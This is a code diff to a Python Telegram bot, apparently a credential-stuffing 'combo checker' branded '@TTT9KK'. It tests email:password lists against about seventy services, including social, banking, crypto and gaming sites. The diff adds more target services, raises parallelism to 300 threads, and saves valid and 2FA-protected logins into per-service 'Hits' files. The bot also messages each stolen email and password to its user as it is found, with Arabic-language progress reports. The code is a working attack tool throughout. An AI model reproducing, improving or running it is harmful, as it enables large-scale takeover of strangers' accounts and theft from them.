@@ -59,35 +59,89 @@ lock = threading.Lock()
 user_stats = {}
 rate_limit_semaphore = Semaphore(500)
 
-# Service definitions
+# Service definitions with categories
 services = {
     # Social Media
-    "Facebook": {"sender": "security@facebookmail.com", "file": "Hits_Facebook.txt"},
-    "Instagram": {"sender": "security@mail.instagram.com", "file": "Hits_Instagram.txt"},
-    "TikTok": {"sender": "register@account.tiktok.com", "file": "Hits_TikTok.txt"},
-    "Twitter": {"sender": "info@x.com", "file": "Hits_Twitter.txt"},
-    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "Hits_LinkedIn.txt"},
-    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "Hits_Pinterest.txt"},
-    "Reddit": {"sender": "noreply@reddit.com", "file": "Hits_Reddit.txt"},
-    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "Hits_Snapchat.txt"},
+    "Facebook": {"sender": "security@facebookmail.com", "file": "Hits_Facebook_by_@TTT9KK.txt", "category": "social"},
+    "Instagram": {"sender": "security@mail.instagram.com", "file": "Hits_Instagram_by_@TTT9KK.txt", "category": "social"},
+    "TikTok": {"sender": "register@account.tiktok.com", "file": "Hits_TikTok_by_@TTT9KK.txt", "category": "social"},
+    "Twitter": {"sender": "info@x.com", "file": "Hits_Twitter_by_@TTT9KK.txt", "category": "social"},
+    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "Hits_LinkedIn_by_@TTT9KK.txt", "category": "social"},
+    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "Hits_Pinterest_by_@TTT9KK.txt", "category": "social"},
+    "Reddit": {"sender": "noreply@reddit.com", "file": "Hits_Reddit_by_@TTT9KK.txt", "category": "social"},
+    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "Hits_Snapchat_by_@TTT9KK.txt", "category": "social"},
+    "VK": {"sender": "noreply@vk.com", "file": "Hits_VK_by_@TTT9KK.txt", "category": "social"},
+    "WeChat": {"sender": "no-reply@wechat.com", "file": "Hits_WeChat_by_@TTT9KK.txt", "category": "social"},
     
-    # Streaming
-    "Netflix": {"sender": "info@account.netflix.com", "file": "Hits_Netflix.txt"},
-    "Spotify": {"sender": "no-reply@spotify.com", "file": "Hits_Spotify.txt"},
-    "Twitch": {"sender": "no-reply@twitch.tv", "file": "Hits_Twitch.txt"},
-    "YouTube": {"sender": "no-reply@youtube.com", "file": "Hits_YouTube.txt"},
-    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "Hits_DisneyPlus.txt"},
+    # Messaging
+    "WhatsApp": {"sender": "no-reply@whatsapp.com", "file": "Hits_WhatsApp_by_@TTT9KK.txt", "category": "messaging"},
+    "Telegram": {"sender": "telegram.org", "file": "Hits_Telegram_by_@TTT9KK.txt", "category": "messaging"},
+    "Discord": {"sender": "noreply@discord.com", "file": "Hits_Discord_by_@TTT9KK.txt", "category": "messaging"},
+    "Signal": {"sender": "no-reply@signal.org", "file": "Hits_Signal_by_@TTT9KK.txt", "category": "messaging"},
+    "Line": {"sender": "no-reply@line.me", "file": "Hits_Line_by_@TTT9KK.txt", "category": "messaging"},
     
-    # Gaming
-    "Steam": {"sender": "noreply@steampowered.com", "file": "Hits_Steam.txt"},
-    "Epic Games": {"sender": "help@epicgames.com", "file": "Hits_EpicGames.txt"},
-    "PlayStation": {"sender": "Sony_Computer_Entertainment@playstationmail.com", "file": "Hits_PlayStation.txt"},
-    "Xbox": {"sender": "xbox@email.xbox.com", "file": "Hits_Xbox.txt"},
+    # Streaming & Entertainment
+    "Netflix": {"sender": "info@account.netflix.com", "file": "Hits_Netflix_by_@TTT9KK.txt", "category": "streaming"},
+    "Spotify": {"sender": "no-reply@spotify.com", "file": "Hits_Spotify_by_@TTT9KK.txt", "category": "streaming"},
+    "Twitch": {"sender": "no-reply@twitch.tv", "file": "Hits_Twitch_by_@TTT9KK.txt", "category": "streaming"},
+    "YouTube": {"sender": "no-reply@youtube.com", "file": "Hits_YouTube_by_@TTT9KK.txt", "category": "streaming"},
+    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "Hits_DisneyPlus_by_@TTT9KK.txt", "category": "streaming"},
+    "Hulu": {"sender": "account@hulu.com", "file": "Hits_Hulu_by_@TTT9KK.txt", "category": "streaming"},
+    "HBO Max": {"sender": "no-reply@hbomax.com", "file": "Hits_HBOMax_by_@TTT9KK.txt", "category": "streaming"},
+    "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "Hits_AmazonPrime_by_@TTT9KK.txt", "category": "streaming"},
+    "Apple TV+": {"sender": "no-reply@apple.com", "file": "Hits_AppleTV_by_@TTT9KK.txt", "category": "streaming"},
+    "Crunchyroll": {"sender": "noreply@crunchyroll.com", "file": "Hits_Crunchyroll_by_@TTT9KK.txt", "category": "streaming"},
     
-    # Finance
-    "PayPal": {"sender": "service@paypal.com.br", "file": "Hits_PayPal.txt"},
-    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "Hits_Binance.txt"},
-    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "Hits_Coinbase.txt"},
+    # E-commerce & Shopping
+    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "Hits_Amazon_by_@TTT9KK.txt", "category": "shopping"},
+    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "Hits_eBay_by_@TTT9KK.txt", "category": "shopping"},
+    "Shopify": {"sender": "no-reply@shopify.com", "file": "Hits_Shopify_by_@TTT9KK.txt", "category": "shopping"},
+    "Etsy": {"sender": "transaction@etsy.com", "file": "Hits_Etsy_by_@TTT9KK.txt", "category": "shopping"},
+    "AliExpress": {"sender": "no-reply@aliexpress.com", "file": "Hits_AliExpress_by_@TTT9KK.txt", "category": "shopping"},
+    "Walmart": {"sender": "no-reply@walmart.com", "file": "Hits_Walmart_by_@TTT9KK.txt", "category": "shopping"},
+    
+    # Payment & Finance
+    "PayPal": {"sender": "service@paypal.com.br", "file": "Hits_PayPal_by_@TTT9KK.txt", "category": "finance"},
+    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "Hits_Binance_by_@TTT9KK.txt", "category": "finance"},
+    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "Hits_Coinbase_by_@TTT9KK.txt", "category": "finance"},
+    "Revolut": {"sender": "no-reply@revolut.com", "file": "Hits_Revolut_by_@TTT9KK.txt", "category": "finance"},
+    "Venmo": {"sender": "no-reply@venmo.com", "file": "Hits_Venmo_by_@TTT9KK.txt", "category": "finance"},
+    "Cash App": {"sender": "no-reply@cash.app", "file": "Hits_CashApp_by_@TTT9KK.txt", "category": "finance"},
+    
+    # Gaming Platforms
+    "Steam": {"sender": "noreply@steampowered.com", "file": "Hits_Steam_by_@TTT9KK.txt", "category": "gaming"},
+    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "Hits_Xbox_by_@TTT9KK.txt", "category": "gaming"},
+    "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "Hits_PlayStation_by_@TTT9KK.txt", "category": "gaming"},
+    "Epic Games": {"sender": "help@acct.epicgames.com", "file": "Hits_EpicGames_by_@TTT9KK.txt", "category": "gaming"},
+    "EA Sports": {"sender": "EA@e.ea.com", "file": "Hits_EASports_by_@TTT9KK.txt", "category": "gaming"},
+    "Ubisoft": {"sender": "noreply@ubisoft.com", "file": "Hits_Ubisoft_by_@TTT9KK.txt", "category": "gaming"},
+    "Riot Games": {"sender": "no-reply@riotgames.com", "file": "Hits_RiotGames_by_@TTT9KK.txt", "category": "gaming"},
+    "Valorant": {"sender": "noreply@valorant.com", "file": "Hits_Valorant_by_@TTT9KK.txt", "category": "gaming"},
+    "Roblox": {"sender": "accounts@roblox.com", "file": "Hits_Roblox_by_@TTT9KK.txt", "category": "gaming"},
+    "Minecraft": {"sender": "noreply@mojang.com", "file": "Hits_Minecraft_by_@TTT9KK.txt", "category": "gaming"},
+    "Fortnite": {"sender": "noreply@epicgames.com", "file": "Hits_Fortnite_by_@TTT9KK.txt", "category": "gaming"},
+    
+    # Tech & Productivity
+    "Google": {"sender": "no-reply@accounts.google.com", "file": "Hits_Google_by_@TTT9KK.txt", "category": "tech"},
+    "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com", "file": "Hits_Microsoft_by_@TTT9KK.txt", "category": "tech"},
+    "Apple": {"sender": "no-reply@apple.com", "file": "Hits_Apple_by_@TTT9KK.txt", "category": "tech"},
+    "GitHub": {"sender": "noreply@github.com", "file": "Hits_GitHub_by_@TTT9KK.txt", "category": "tech"},
+    "Dropbox": {"sender": "no-reply@dropbox.com", "file": "Hits_Dropbox_by_@TTT9KK.txt", "category": "tech"},
+    "Zoom": {"sender": "no-reply@zoom.us", "file": "Hits_Zoom_by_@TTT9KK.txt", "category": "tech"},
+    "Slack": {"sender": "no-reply@slack.com", "file": "Hits_Slack_by_@TTT9KK.txt", "category": "tech"},
+    
+    # VPN & Security
+    "NordVPN": {"sender": "no-reply@nordvpn.com", "file": "Hits_NordVPN_by_@TTT9KK.txt", "category": "security"},
+    "ExpressVPN": {"sender": "no-reply@expressvpn.com", "file": "Hits_ExpressVPN_by_@TTT9KK.txt", "category": "security"},
+    
+    # Travel & Transportation
+    "Airbnb": {"sender": "no-reply@airbnb.com", "file": "Hits_Airbnb_by_@TTT9KK.txt", "category": "travel"},
+    "Uber": {"sender": "no-reply@uber.com", "file": "Hits_Uber_by_@TTT9KK.txt", "category": "travel"},
+    "Booking.com": {"sender": "no-reply@booking.com", "file": "Hits_Booking_by_@TTT9KK.txt", "category": "travel"},
+    
+    # Food Delivery
+    "Uber Eats": {"sender": "no-reply@ubereats.com", "file": "Hits_UberEats_by_@TTT9KK.txt", "category": "food"},
+    "DoorDash": {"sender": "no-reply@doordash.com", "file": "Hits_DoorDash_by_@TTT9KK.txt", "category": "food"},
 }
 
 # ==================== USER MANAGEMENT ====================
@@ -857,7 +911,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_combos(query, context, file_path, lines, scan_type)
 
 async def process_combos(query, context, file_path, lines, scan_type):
-    """Process combo list with INSTANT result sending"""
+    """Process combo list with THREADS for faster checking"""
     user_id = query.from_user.id
     
     # Initialize stats
@@ -884,114 +938,145 @@ async def process_combos(query, context, file_path, lines, scan_type):
     )
     
     start_time = time.time()
+    stats_lock = threading.Lock()
     
-    # Process combos with rate limiting
-    for i, line in enumerate(lines):
+    # Thread-safe function to process single combo
+    def process_single_combo(line):
         if ':' not in line:
-            continue
+            return None
         
         parts = line.split(':', 1)
         email = parts[0].strip()
         password = parts[1].strip()
         
-        # Small delay to avoid rate limiting
+        # Small delay
         time.sleep(random.uniform(0.3, 0.5))
         
         # Check account
         result = check_account(email, password, user_id)
         
-        stats["processed"] += 1
+        with stats_lock:
+            stats["processed"] += 1
+            
+            if result["status"] == "hit":
+                stats["hit"] += 1
+                
+                # Save hit
+                hit_file = os.path.join(result_dir, "Hits_All.txt")
+                with open(hit_file, 'a', encoding='utf-8') as f:
+                    f.write(f"{email}:{password} | {result['message']}\n")
+                
+                # Save per service
+                for service_name in result["services"].keys():
+                    stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
+                    
+                    service_file = os.path.join(result_dir, services[service_name]["file"])
+                    with open(service_file, 'a', encoding='utf-8') as f:
+                        f.write(f"{email}:{password}\n")
+                
+                return {"type": "hit", "email": email, "password": password, "message": result['message'], "count": stats["hit"]}
+                
+            elif result["status"] == "bad":
+                stats["bad"] += 1
+            elif result["status"] == "locked":
+                stats["locked"] += 1
+            elif result["status"] == "2fa_required":
+                stats["2fa"] += 1
+                stats["hit"] += 1
+                
+                twofa_file = os.path.join(result_dir, "Hits_2FA.txt")
+                with open(twofa_file, 'a', encoding='utf-8') as f:
+                    f.write(f"{email}:{password} | Requires 2FA\n")
+                
+                return {"type": "2fa", "email": email, "password": password, "count": stats["hit"]}
+                
+            elif result["status"] == "retry":
+                stats["retry"] += 1
         
-        # INSTANT HIT NOTIFICATION
-        if result["status"] == "hit":
-            stats["hit"] += 1
+        return None
+    
+    # Use ThreadPoolExecutor for parallel processing
+    max_workers = 300  # Number of threads
+    
+    import asyncio
+    from concurrent.futures import ThreadPoolExecutor
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all tasks
+        futures = []
+        for line in lines:
+            future = executor.submit(process_single_combo, line)
+            futures.append(future)
+        
+        # Process results as they complete
+        from concurrent.futures import as_completed
+        
+        update_counter = 0
+        for future in as_completed(futures):
+            result = future.result()
             
-            # Save hit
-            hit_file = os.path.join(result_dir, "Hits_All.txt")
-            with open(hit_file, 'a', encoding='utf-8') as f:
-                f.write(f"{email}:{password} | {result['message']}\n")
-            
-            # 🚨 SEND HIT IMMEDIATELY TO USER 🚨
-            hit_message = f"""
-🎯 <b>حساب صحيح!</b> #{stats["hit"]}
+            # Send hit immediately
+            if result:
+                if result["type"] == "hit":
+                    hit_message = f"""
+🎯 <b>حساب صحيح!</b> #{result["count"]}
 
-📧 <b>Email:</b> <code>{email}</code>
-🔑 <b>Password:</b> <code>{password}</code>
+📧 <b>Email:</b> <code>{result["email"]}</code>
+🔑 <b>Password:</b> <code>{result["password"]}</code>
 
 {result['message']}
-            """
-            
-            try:
-                await context.bot.send_message(
-                    chat_id=user_id,
-                    text=hit_message,
-                    parse_mode='HTML'
-                )
-            except Exception as e:
-                logger.error(f"Error sending hit: {e}")
-            
-            # Save per service
-            for service_name in result["services"].keys():
-                stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
-                
-                service_file = os.path.join(result_dir, services[service_name]["file"])
-                with open(service_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{email}:{password}\n")
-        
-        elif result["status"] == "bad":
-            stats["bad"] += 1
-            
-        elif result["status"] == "locked":
-            stats["locked"] += 1
-            
-        elif result["status"] == "2fa_required":
-            stats["2fa"] += 1
-            stats["hit"] += 1
-            
-            # Save 2FA accounts
-            twofa_file = os.path.join(result_dir, "Hits_2FA.txt")
-            with open(twofa_file, 'a', encoding='utf-8') as f:
-                f.write(f"{email}:{password} | Requires 2FA\n")
-            
-            # 🚨 SEND 2FA HIT IMMEDIATELY 🚨
-            twofa_message = f"""
-🔐 <b>حساب صحيح - 2FA!</b> #{stats["hit"]}
 
-📧 <b>Email:</b> <code>{email}</code>
-🔑 <b>Password:</b> <code>{password}</code>
+💎 <b>Created by @TTT9KK</b>
+                    """
+                    
+                    try:
+                        await context.bot.send_message(
+                            chat_id=user_id,
+                            text=hit_message,
+                            parse_mode='HTML'
+                        )
+                    except Exception as e:
+                        logger.error(f"Error sending hit: {e}")
+                
+                elif result["type"] == "2fa":
+                    twofa_message = f"""
+🔐 <b>حساب صحيح - 2FA!</b> #{result["count"]}
+
+📧 <b>Email:</b> <code>{result["email"]}</code>
+🔑 <b>Password:</b> <code>{result["password"]}</code>
 
 ⚠️ يحتاج تأكيد ثنائي (2FA)
-            """
+
+💎 <b>Created by @TTT9KK</b>
+                    """
+                    
+                    try:
+                        await context.bot.send_message(
+                            chat_id=user_id,
+                            text=twofa_message,
+                            parse_mode='HTML'
+                        )
+                    except Exception as e:
+                        logger.error(f"Error sending 2FA hit: {e}")
             
-            try:
-                await context.bot.send_message(
-                    chat_id=user_id,
-                    text=twofa_message,
-                    parse_mode='HTML'
-                )
-            except Exception as e:
-                logger.error(f"Error sending 2FA hit: {e}")
+            # Update progress every 10 checks
+            update_counter += 1
+            if update_counter % 10 == 0 or stats["processed"] >= stats["total"]:
+                progress = (stats["processed"] / stats["total"]) * 100
                 
-        elif result["status"] == "retry":
-            stats["retry"] += 1
-        
-        # Update progress every 5 accounts
-        if (i + 1) % 5 == 0 or (i + 1) == stats["total"]:
-            progress = (stats["processed"] / stats["total"]) * 100
-            
-            # Calculate time
-            elapsed = time.time() - start_time
-            if stats["processed"] > 0:
-                avg_time = elapsed / stats["processed"]
-                remaining = (stats["total"] - stats["processed"]) * avg_time
-                eta_minutes = int(remaining / 60)
-                eta_seconds = int(remaining % 60)
-                eta_text = f"\n⏱️ المتبقي: ~{eta_minutes}د {eta_seconds}ث"
-            else:
-                eta_text = ""
-            
-            progress_text = f"""
-⏳ <b>جاري الفحص...</b>
+                # Calculate time
+                elapsed = time.time() - start_time
+                if stats["processed"] > 0:
+                    avg_time = elapsed / stats["processed"]
+                    remaining = (stats["total"] - stats["processed"]) * avg_time
+                    eta_minutes = int(remaining / 60)
+                    eta_seconds = int(remaining % 60)
+                    eta_text = f"\n⏱️ المتبقي: ~{eta_minutes}د {eta_seconds}ث"
+                else:
+                    eta_text = ""
+                
+                progress_text = f"""
+⏳ <b>جاري الفحص بـ {max_workers} ثريدات...</b>
 
 📊 التقدم: {stats["processed"]}/{stats["total"]} ({progress:.1f}%)
 {eta_text}
@@ -1003,12 +1088,13 @@ async def process_combos(query, context, file_path, lines, scan_type):
 🔄 إعادة: {stats["retry"]}
 
 💡 يتم إرسال كل حساب صحيح فوراً!
-            """
-            
-            try:
-                await status_msg.edit_text(progress_text, parse_mode='HTML')
-            except:
-                pass
+💎 <b>Created by @TTT9KK</b>
+                """
+                
+                try:
+                    await status_msg.edit_text(progress_text, parse_mode='HTML')
+                except:
+                    pass
     
     # Final results
     final_text = f"""
@@ -1023,11 +1109,14 @@ async def process_combos(query, context, file_path, lines, scan_type):
 • إعادة: {stats["retry"]}
 
 🎯 <b>الخدمات: {len(stats["services_found"])}</b>
+
+💎 <b>Created by @TTT9KK</b>
+📢 <b>Channel:</b> {TELEGRAM_CHANNEL}
     """
     
     if stats["services_found"]:
-        final_text += "\n"
-        for service, count in sorted(stats["services_found"].items(), key=lambda x: x[1], reverse=True)[:10]:
+        final_text += "\n\n<b>🎯 الخدمات المكتشفة:</b>\n"
+        for service, count in sorted(stats["services_found"].items(), key=lambda x: x[1], reverse=True)[:15]:
             final_text += f"• {service}: {count}\n"
     
     await status_msg.edit_text(final_text, parse_mode='HTML')
@@ -1036,7 +1125,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
     if stats["hit"] > 0:
         await context.bot.send_message(
             chat_id=user_id,
-            text="📁 <b>إرسال ملفات النتائج...</b>",
+            text="📁 <b>إرسال ملفات النتائج...</b>\n\n💎 <b>Created by @TTT9KK</b>",
             parse_mode='HTML'
         )
         
@@ -1047,7 +1136,8 @@ async def process_combos(query, context, file_path, lines, scan_type):
                 await context.bot.send_document(
                     chat_id=user_id,
                     document=open(file_path_result, 'rb'),
-                    caption=f"📄 {filename}\n\n💎 {MY_SIGNATURE}"
+                    caption=f"📄 {filename}\n\n💎 <b>Created by @TTT9KK</b>\n📢 {TELEGRAM_CHANNEL}",
+                    parse_mode='HTML'
                 )
                 time.sleep(0.5)
             except Exception as e:
@@ -1069,7 +1159,8 @@ async def process_combos(query, context, file_path, lines, scan_type):
 2. جرب كومبو جديد (أقل من شهر)
 3. استخدم quick_tester.py لاختبار الكومبو
 
-👤 آيديك: <code>{user_id}</code>
+💎 <b>Created by @TTT9KK</b>
+📢 <b>Channel:</b> {TELEGRAM_CHANNEL}
             """,
             parse_mode='HTML'
         )
